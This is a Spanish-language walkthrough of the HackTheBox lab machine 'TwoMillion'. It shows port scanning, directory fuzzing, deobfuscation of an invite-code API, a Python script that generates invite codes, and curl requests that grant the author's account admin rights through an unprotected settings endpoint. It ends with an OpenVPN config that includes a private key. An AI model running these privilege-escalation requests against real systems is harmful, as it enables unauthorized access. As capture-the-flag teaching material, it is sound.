---
icon: flag
---

# TwoMillion HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 04:53 EDT
Nmap scan report for 10.10.11.221
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
```

Veremos que hay varios puertos entre ellos el `80` el cual nos esta redirigiendo a un `dominio` llamado `2million.htb`, vamos añadirlo en nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>          2million.htb
```

Lo guardamos y entramos a dicho dominio, entrando dentro del mismo veremos una pagina web la cual se dedica a `pentesting` de forma ética de tipo laboratorios, etc...

Veremos que hay un `login` en el panel de arriba, si entramos dentro de dicha opcion, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-30 140417.png" alt=""><figcaption></figcaption></figure>

Pero no tenemos ninguna cuenta para acceder y tampoco vemos que haya un registro de cuentas en algun boton, por lo que vamos a realizar un poco de `fuzzing` para ver que vemos.

## Gobuster

```shell
gobuster dir -u http://2million.htb/ -w <WORDLIST> -x html,php,txt -t 100 -k -r --exclude-length 1674
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://2million.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          1674
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 403) [Size: 146]
/login                (Status: 200) [Size: 3704]
/home                 (Status: 200) [Size: 64952]
/register             (Status: 200) [Size: 4527]
/assets               (Status: 403) [Size: 146]
/css                  (Status: 403) [Size: 146]
/js                   (Status: 403) [Size: 146]
/api                  (Status: 401) [Size: 0]
/logout               (Status: 200) [Size: 64952]
/fonts                (Status: 403) [Size: 146]
/views                (Status: 200) [Size: 64952]
/VPN                  (Status: 403) [Size: 146]
/Database.php         (Status: 200) [Size: 0]
/invite               (Status: 200) [Size: 3859]

```

Veremos muchas cosas interesantes, pero entre ello veremos un `register` por lo que vamos a entrar ahi, a ver si podemos crear una cuenta.

```
URL = http://2million.htb/register
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-30 140703.png" alt=""><figcaption></figcaption></figure>

Dentro efectivamente nos podremos registrar, por lo que vamos a rellenar todos los datos y a registrarnos con un usuario.

Pero si le damos a registrar, nos pedira un codigo de invitacion primero el cual no tenemos, recordemos que encontramos otro recurso llamado `/invite` en el cual si entramos pone que pongamos un codigo de invitacion valido pero lo seguimos sin tener, si inspeccionamos el codigo veremos un `.js` llamado `inviteapi.min.js` dentro veremos lo siguiente:

```js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

Si lo analizamos vemos que esta ofuscado en `Dean Edwards' Packer` si lo deofuscamos con `IA` veremos lo siguiente:

```js
function verifyInviteCode(code) {
    var formData = {"code":code};
    $.ajax({
        type:"POST",
        dataType:"json",
        data:formData,
        url:'/api/v1/invite/verify',
        success:function(response){console.log(response)},
        error:function(response){console.log(response)}
    })
}

function makeInviteCode() {
    $.ajax({
        type:"POST", 
        dataType:"json",
        url:'/api/v1/invite/how/to/generate',
        success:function(response){console.log(response)},
        error:function(response){console.log(response)}
    })
}
```

Veremos que podemos generar un codigo de invitacion, tambien vemos que nos da instrucciones de como generarlo, por lo que vamos a obtener dichas instrucciones de esta forma:

```shell
curl -X POST http://2million.htb/api/v1/invite/how/to/generate -H "Content-Type: application/json" -d '{}'
```

Info:

```json
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

Vemos que esta encriptado en `ROT13` si lo decodificamos veremos lo siguiente:

```
"In order to generate the invite code, make a POST request to /api/v1/invite/generate"
```

Vamos a montarnos un pequeño script para que lo automatice todo esto:

> generateCode.py

```python
#!/usr/bin/env python3
import requests
import json
import codecs

def rot13_decode(text):
    """Decodifica texto en ROT13"""
    return codecs.decode(text, 'rot13')

def get_invite_instructions():
    """Obtiene instrucciones para generar el código de invitación"""
    url = "http://2million.htb/api/v1/invite/how/to/generate"
    
    response = requests.post(url, json={})
    
    if response.status_code == 200:
        data = response.json()
        print("[+] Respuesta del servidor:")
        print(json.dumps(data, indent=2))
        
        # Decodificar el mensaje ROT13
        if 'data' in data and 'data' in data['data']:
            encrypted_msg = data['data']['data']
            decrypted_msg = rot13_decode(encrypted_msg)
            print(f"\n[+] Mensaje descifrado (ROT13): {decrypted_msg}")
            
        return data
    else:
        print(f"[-] Error: {response.status_code}")
        return None

def generate_invite_code():
    """Genera un código de invitación"""
    generate_url = "http://2million.htb/api/v1/invite/generate"
    response = requests.post(generate_url, json={})
    
    if response.status_code == 200:
        invite_data = response.json()
        print(f"\n[+] Respuesta de generación:")
        print(json.dumps(invite_data, indent=2))
        return invite_data
    else:
        print(f"[-] Error en generación: {response.status_code}")
        return None

def verify_invite_code(code):
    """Verifica un código de invitación"""
    url = "http://2million.htb/api/v1/invite/verify"
    data = {"code": code}
    
    response = requests.post(url, json=data)
    
    if response.status_code == 200:
        result = response.json()
        print(f"\n[+] Verificación del código:")
        print(json.dumps(result, indent=2))
        return result
    else:
        print(f"[-] Error en verificación: {response.status_code}")
        return None

if __name__ == "__main__":
    print("[*] Obteniendo instrucciones para generar código de invitación...")
    
    # Paso 1: Obtener y descifrar instrucciones
    instructions = get_invite_instructions()
    
    # Paso 2: Generar código de invitación
    print("\n[*] Generando código de invitación...")
    invite_data = generate_invite_code()
    
    if invite_data and 'data' in invite_data:
        # El código probablemente viene en formato codificado
        code_data = invite_data['data']
        print(f"\n[🎫] Datos del código: {code_data}")
        
        # Intentar decodificar si está en base64 o otro formato
        if isinstance(code_data, str) and len(code_data) > 10:
            # Probar diferentes decodificaciones
            try:
                import base64
                decoded = base64.b64decode(code_data).decode()
                print(f"[+] Decodificado Base64: {decoded}")
                code_to_verify = decoded
            except:
                code_to_verify = code_data
            
            # Paso 3: Verificar el código
            print("\n[*] Verificando código...")
            verify_invite_code(code_to_verify)
```

Ahora lo ejecutamos de esta forma:

```shell
python3 generateCode.py
```

Info:

```
[*] Obteniendo instrucciones para generar código de invitación...
[+] Respuesta del servidor:
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}

[+] Mensaje descifrado (ROT13): In order to generate the invite code, make a POST request to /api/v1/invite/generate

[*] Generando código de invitación...

[+] Respuesta de generación:
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "QVNKWlktOFUzUzYtN0JCUzMtQzQ4VVM=",
    "format": "encoded"
  }
}

[🎫] Datos del código: {'code': 'QVNKWlktOFUzUzYtN0JCUzMtQzQ4VVM=', 'format': 'encoded'}
```

Veremos que ha funcionado, pero nos lo codifica en `base64` por lo que lo tenemos que decodificar:

```shell
echo 'QVNKWlktOFUzUzYtN0JCUzMtQzQ4VVM=' | base64 -d
```

Info:

```
ASJZY-8U3S6-7BBS3-C48US
```

Ahora si ese codigo lo metemos en el campo de `/invite` veremos que nos redirige al register con el codigo de invitacion ya:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-30 150633.png" alt=""><figcaption></figcaption></figure>

Una vez metiendo todos los datos, vamos a registrarnos, echo esto nos redirige al `login` y veremos que funciona, una vez `logueados` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-30 150700.png" alt=""><figcaption></figcaption></figure>

Estamos en un panel de control con nuestro usuario, si nos vamos a `access` veremos un panel en el que nos podemos descargar una `vpn` para conectarnos desde nuestra maquina a la red de la pagina, pero vemos en el siguiente `link` como esta descargando la `vpn`:

```html

<a href="/api/v1/user/vpn/generate" class="btn btn-w-md btn-default btn-block">
	<i class="fa fa-cloud-download"></i> 
	Connection Pack
</a> 
```

Vemos que atraves de esa `URL` esta generando la `vpn` con nuestro usuario, pero si probamos a cambiar `user` por `admin` veremos una pantalla en blanco como que algo esta funcionando, pero no nos descarga nada, si nos vamos a la configuracion de la `API`.

```
URL = http://2million.htb/api/v1
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-30 153937.png" alt=""><figcaption></figcaption></figure>

Veremos varias cosas interesantes, vamos aprovechar esto para probar a ver que nos devuelve el `update`:

```shell
apt install jq
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=<COOKIE_SESSION>" \
  -d '{}' | jq
```

Info:

```
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Ya sabemos como rellenar el contenido para que funcione, por lo que haremos lo siguiente, al registrar el email de nuestro usuario tendremos que ponerlo en ese parametro `email`:

```shell
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=<COOKIE_SESSION>" \
  -d '{"email":"test@test.com"}' | jq
```

Info:

```
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Veremos que ahora nos falta el parametro `is_admin`, por lo que haremos esto:

```shell
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=<COOKIE_SESSION>" \
  -d '{"email":"test@test.com", "is_admin":true}' | jq
```

Info:

```
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

Nos pone que tiene que ser `1` o `0`, por lo que elegiremos `1` para que sea admin nuestro usuario.

```shell
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=<COOKIE_SESSION>" \
  -d '{"email":"test@test.com", "is_admin":1}' | jq
```

Info:

```
{
  "id": 16,
  "username": "diseo",
  "is_admin": 1
}
```

Vemos que ha funcionado, por lo que ya seremos `admin` con dicho usuario, ahora si entramos al panel con dicho usuario de nuevo veremos lo de siempre, vamos a probar a generar la `vpn` desde nuestra terminal.

```shell
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=<COOKIE_SESSION>" | jq
```

Info:

```
{
  "status": "danger",
  "message": "Missing parameter: username"
}
```

Vemos que requiere de un nombre de usuario, si se lo pasamos:

```shell
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=<COOKIE_SESSION>" \
  -d '{"username":"diseo"}'
```

Info:

```
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
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
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 3 (0x3)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Sep 30 13:59:10 2025 GMT
            Not After : Sep 30 13:59:10 2026 GMT
        Subject: C=GB, ST=London, L=London, O=diseo, CN=diseo
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:ae:22:8d:ea:2b:d2:72:60:01:a8:ee:b0:76:3f:
                    8f:3f:87:d3:a4:a7:60:cf:a2:24:46:79:4a:c6:11:
                    3a:88:ab:28:a9:4d:40:0d:70:1f:d4:46:0f:f8:cc:
                    a3:e8:0b:9d:44:94:4e:53:84:6f:49:18:3f:b6:8d:
                    ba:75:12:8c:49:39:4a:0e:ff:6f:d8:68:25:8c:1d:
                    1e:6e:5e:85:a9:f7:91:0f:f2:8b:2e:5b:55:10:1e:
                    51:d6:13:4a:67:3e:41:8b:11:53:c8:88:64:0a:2a:
                    72:92:89:ce:4b:fa:4a:dc:06:44:47:fa:1f:7e:a7:
                    13:b9:a8:3d:86:bf:10:fc:21:b1:01:e8:95:13:42:
                    3e:be:49:34:72:db:1b:46:24:14:a6:73:1b:b4:72:
                    bc:cc:a4:c4:6b:44:c5:5d:34:87:28:76:91:ab:9a:
                    b8:34:f8:7c:f6:17:fd:d7:23:cb:e6:9d:ae:eb:9f:
                    1d:97:29:8e:31:1c:da:2b:ce:66:8e:62:88:81:5c:
                    a8:09:fd:c7:a1:71:a0:9d:27:93:35:5a:45:93:ac:
                    6b:e6:27:8a:cf:d5:02:c3:ce:50:c5:5b:b4:19:4a:
                    ed:9b:4b:a3:cb:9f:35:92:d1:c0:3a:2b:46:56:e2:
                    d2:df:cc:95:e7:7a:ee:34:a9:dc:e2:46:b2:29:d6:
                    6f:73
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                86:4A:62:07:50:A0:4E:B4:D1:B3:91:7C:4D:8C:83:6B:BD:90:3C:3B
            X509v3 Authority Key Identifier: 
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment: 
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        64:90:23:da:67:de:38:53:1e:d6:4e:55:e8:d1:14:1a:c5:5f:
        01:79:cf:e5:5d:1f:67:88:df:19:36:33:81:99:71:b2:80:2f:
        f4:59:3b:06:bc:b0:92:87:14:0c:df:48:d1:02:d6:dc:dd:ac:
        e8:f2:17:d9:b1:c8:c5:a0:8b:24:c7:14:a9:19:9b:42:4e:d6:
        77:f8:23:d1:6c:46:c7:93:96:cf:bd:1e:f2:dc:a1:c8:8a:9a:
        34:25:6b:2c:f1:ce:f8:b0:6e:76:e1:cf:10:d9:be:e9:e5:60:
        7f:1a:cf:1e:bc:cf:e0:3a:ad:b8:24:0c:c0:58:8a:16:54:06:
        02:a8:27:20:8b:82:06:c6:3e:22:c6:e5:45:87:9e:8a:44:d4:
        8d:b4:2d:38:ee:2c:1b:3d:4c:73:a4:81:6b:3d:85:cc:32:91:
        73:7a:41:94:97:d9:76:c7:63:93:80:ed:b5:4b:d6:42:f2:58:
        0d:13:ae:ae:ad:c5:ff:b3:94:82:6d:19:c2:59:4d:40:c7:c5:
        a8:70:81:5a:f9:2c:0c:24:97:89:92:4a:d6:4e:d1:7d:3d:40:
        c0:b8:90:69:38:fc:30:c2:67:29:de:45:ff:1b:c9:46:07:23:
        8d:90:92:0a:d7:04:11:0a:38:b5:5f:73:1e:65:ff:6e:c6:e7:
        19:a8:81:d1:68:b0:30:69:23:a4:29:d9:0a:2b:ef:fe:c7:7e:
        2b:4f:a6:7d:38:0a:76:ea:9f:c9:75:d6:d6:8a:36:98:21:3a:
        e0:86:8d:2c:58:bf:42:ec:2f:c2:36:13:90:9d:59:fd:a9:c0:
        6f:d1:a8:55:c8:09:6f:c7:a3:81:c9:a8:b1:4f:07:55:a6:50:
        a7:4c:ec:80:67:f3:1c:58:ff:cb:3d:24:fc:42:84:4e:73:ce:
        ad:63:db:0e:95:81:df:7a:e7:7c:8f:1b:a1:51:de:5a:c5:b6:
        ee:85:cd:c0:20:ab:51:45:89:ca:0e:3a:ca:4f:b8:89:92:94:
        62:16:8e:2d:1a:bd:c4:56:e2:17:37:a9:e1:f4:cf:b6:12:ca:
        36:2f:bf:86:44:30:61:cf:51:05:65:55:49:cc:30:67:d1:23:
        ff:e6:d6:58:c4:d0:9b:dc:22:b4:cb:58:b6:ac:13:e6:b4:66:
        8e:8b:9a:a0:d1:46:6a:c7:8b:b3:8f:c1:3a:99:2c:6e:81:2d:
        9b:0a:3b:c7:d7:33:e1:b4:69:4c:f1:e5:b8:21:c5:f1:93:26:
        cb:df:20:17:09:9b:71:71:93:2a:69:86:42:b4:50:3f:c4:1c:
        d0:31:36:62:e1:3f:06:1c:a9:d7:6a:98:69:ab:2d:4f:ee:fe:
        36:61:e1:01:19:73:fe:ea
-----BEGIN CERTIFICATE-----
MIIE3TCCAsWgAwIBAgIBAzANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
VGhlQm94MQwwCgYDVQQLDANWUE4xETAPBgNVBAMMCDJtaWxsaW9uMSEwHwYJKoZI
hvcNAQkBFhJpbmZvQGhhY2t0aGVib3guZXUwHhcNMjUwOTMwMTM1OTEwWhcNMjYw
OTMwMTM1OTEwWjBPMQswCQYDVQQGEwJHQjEPMA0GA1UECAwGTG9uZG9uMQ8wDQYD
VQQHDAZMb25kb24xDjAMBgNVBAoMBWRpc2VvMQ4wDAYDVQQDDAVkaXNlbzCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK4ijeor0nJgAajusHY/jz+H06Sn
YM+iJEZ5SsYROoirKKlNQA1wH9RGD/jMo+gLnUSUTlOEb0kYP7aNunUSjEk5Sg7/
b9hoJYwdHm5ehan3kQ/yiy5bVRAeUdYTSmc+QYsRU8iIZAoqcpKJzkv6StwGREf6
H36nE7moPYa/EPwhsQHolRNCPr5JNHLbG0YkFKZzG7RyvMykxGtExV00hyh2kaua
uDT4fPYX/dcjy+adruufHZcpjjEc2ivOZo5iiIFcqAn9x6FxoJ0nkzVaRZOsa+Yn
is/VAsPOUMVbtBlK7ZtLo8ufNZLRwDorRlbi0t/Mled67jSp3OJGsinWb3MCAwEA
AaOBiTCBhjAdBgNVHQ4EFgQUhkpiB1CgTrTRs5F8TYyDa72QPDswHwYDVR0jBBgw
FoAUemLdHbb+Ssjj+J/6rPQVDJa6LpEwCQYDVR0TBAIwADALBgNVHQ8EBAMCAf4w
LAYJYIZIAYb4QgENBB8WHU9wZW5TU0wgR2VuZXJhdGVkIENlcnRpZmljYXRlMA0G
CSqGSIb3DQEBCwUAA4ICAQBkkCPaZ944Ux7WTlXo0RQaxV8Bec/lXR9niN8ZNjOB
mXGygC/0WTsGvLCShxQM30jRAtbc3azo8hfZscjFoIskxxSpGZtCTtZ3+CPRbEbH
k5bPvR7y3KHIipo0JWss8c74sG524c8Q2b7p5WB/Gs8evM/gOq24JAzAWIoWVAYC
qCcgi4IGxj4ixuVFh56KRNSNtC047iwbPUxzpIFrPYXMMpFzekGUl9l2x2OTgO21
S9ZC8lgNE66urcX/s5SCbRnCWU1Ax8WocIFa+SwMJJeJkkrWTtF9PUDAuJBpOPww
wmcp3kX/G8lGByONkJIK1wQRCji1X3MeZf9uxucZqIHRaLAwaSOkKdkKK+/+x34r
T6Z9OAp26p/JddbWijaYITrgho0sWL9C7C/CNhOQnVn9qcBv0ahVyAlvx6OByaix
TwdVplCnTOyAZ/McWP/LPST8QoROc86tY9sOlYHfeud8jxuhUd5axbbuhc3AIKtR
RYnKDjrKT7iJkpRiFo4tGr3EVuIXN6nh9M+2Eso2L7+GRDBhz1EFZVVJzDBn0SP/
5tZYxNCb3CK0y1i2rBPmtGaOi5qg0UZqx4uzj8E6mSxugS2bCjvH1zPhtGlM8eW4
IcXxkybL3yAXCZtxcZMqaYZCtFA/xBzQMTZi4T8GHKnXaphpqy1P7v42YeEBGXP+
6g==
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCuIo3qK9JyYAGo
7rB2P48/h9Okp2DPoiRGeUrGETqIqyipTUANcB/URg/4zKPoC51ElE5ThG9JGD+2
jbp1EoxJOUoO/2/YaCWMHR5uXoWp95EP8osuW1UQHlHWE0pnPkGLEVPIiGQKKnKS
ic5L+krcBkRH+h9+pxO5qD2GvxD8IbEB6JUTQj6+STRy2xtGJBSmcxu0crzMpMRr
RMVdNIcodpGrmrg0+Hz2F/3XI8vmna7rnx2XKY4xHNorzmaOYoiBXKgJ/cehcaCd
J5M1WkWTrGvmJ4rP1QLDzlDFW7QZSu2bS6PLnzWS0cA6K0ZW4tLfzJXneu40qdzi
RrIp1m9zAgMBAAECggEAEUSI7nSWWP7Z5fQhbeBt++lOsfsNF8SRifwuJN0BgRr5
RxdLfOmmUQj6PXxMMU8G3eLtBM19sZxkzl1Yj5Jyydy9/NBqDrt+ea9Lh2X6euPQ
r+mn0UV/oRUN8sdqmeQBC4wrfZe/f93nYE5SYD4Q3VJbxAgdcRRFWaRBfFKxxFFd
t2A8JBCNK+9Ez9Kk/HIys4/BnDGuwSPWYTuCjMPmHOu9Ei+rIJk/ecdnBNEIYEMu
/bHfMZDThB2hSqpykOHf9uwD6cwYKsAvAj+Tty4gbOWWibmm+IEtiThQ6tJFRW/4
JnvehfDK0W2TfR0WD1toZQtsZ4l0mQIlsiJmYaXH7QKBgQDI84J28NEDsq3Bl71v
udTe/teWBgM09Tv2zRkMcoagA5BxipA6TrtmntwF2M9DGevn0NiKsDEDq0xoqiFa
Veg44NFIZvkd8H8wj/68E3tOexklKZfL/t846/BRxwVmq0dCpRL5d1r5Js2oDmdQ
YKcl/X5x1Vlprg3A5Fs190awXQKBgQDd1nOVGvakFyNhMROsEdpk8NacCcKkfiTq
21tjZk/n8Gb4LqrqS3XhbhseEe6e2Oj7VhDJHT0bDZd0LhqIzAWMB3ZqyROsKMae
CzuGzXKZ4ZctvJz0HRQlC6qfuCPqtmnQRi3bzllBIjn1ki5PvoqFYELAjJ5Kx26r
Z+mdCQDiDwKBgDiQ01jH0Q5Jbb/hBuI8XT+oXOdOKfjuT0LZ2QM3+c1xM2fCqXbA
UuBAN48tyKoK0e0fTNU9Y4602X1c5qaXKBdasY6/7cAPwr3YyswGb99Xp2xemOxD
gnJzd+KNM2gDLrwD26N9hY487gcwhsSJcIOxJ7bDZ7fn1tdFcKdwQ+XBAoGACVUN
NbeVqp+CkIMlBbcWjeqHzLaoZo0b9nlV5d+W+vXlDwm/jO2xvtMH9wLgG/SaEIC1
YhCF0o6G0Y9i9GBI13Q06hcdab+pY1qrnWclLA4OcxEdNTPH9isAeYmgkS4tU2Kw
aS/MF25eK9ODeT1VzHiZNkp0Gkc7g6BydnW7gMcCgYArkV7sGwjKx0xsgj5qpih3
OjaPmGIIwh1FBbyHmFajjV8Pac1333GpHjF/+GE1KtOueGIQuELCtsyWECkwMhPH
GG9cbUK8sH4sPyuq+Bs1Pj7OzpnrUpe0Z0vcthcnLpMaTQxUUk3t7uvWaNP7h6o5
BzcWU8XjJM7CJq/vuf+cGg==
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
358730b4f3bcb119b03e43c46a856444
05e96eaed55755e3eef41cd21538d041
079c0fc8312517d851195139eceb458b
f8ff28ba7d46ef9ce65f13e0e259e5e3
068a47535cd80980483a64d16b7d10ca
574bb34c7ad1490ca61d1f45e5987e26
7952930b85327879cc0333bb96999abe
2d30e4b592890149836d0f1eacd2cb8c
a67776f332ec962bc22051deb9a94a78
2b51bafe2da61c3dc68bbdd39fa35633
e511535e57174665a2495df74f186a83
479944660ba924c91dd9b00f61bc09f5
2fe7039aa114309111580bc5c910b4ac
c9efb55a3f0853e4b6244e3939972ff6
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----
</tls-auth>
```

